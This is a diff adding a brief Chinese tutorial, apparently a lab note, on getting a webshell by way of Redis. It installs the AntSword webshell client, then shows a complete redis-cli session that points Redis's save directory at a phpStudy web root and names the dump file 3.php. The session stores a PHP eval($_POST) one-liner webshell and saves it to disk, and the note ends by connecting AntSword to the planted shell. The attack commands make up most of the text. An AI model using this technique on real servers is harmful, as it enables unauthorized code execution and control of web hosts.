@@ -1,0 +1,23 @@
+1、安装蚁剑
+安装过程不描述了，就强调一点，如果是解压代码失败，可以使用git命令直接下载源代码，然后选择源代码所在目录进行初始化，之后重启应用即可
+
+2、连接redis写入webshell
+
+这里可以使用图形界面客户端，也可以使用redis-cli
+这里介绍直接写入webshell文件的方法
+
+PS E:\Redis-x64-3.2.100> .\redis-cli.exe
+127.0.0.1:6379> config set dir D:/phpstudy_pro/www    
+OK
+127.0.0.1:6379> config set dbfilename 3.php
+OK
+127.0.0.1:6379> set x "<?php @eval($_POST['mamba']); ?>"
+OK
+127.0.0.1:6379> save
+OK
+127.0.0.1:6379>
+
+先转到网站目录下，然后写入3.php文件  追加文件内容  保存写入持久化
+
+3、蚁剑连接
+获取webshell
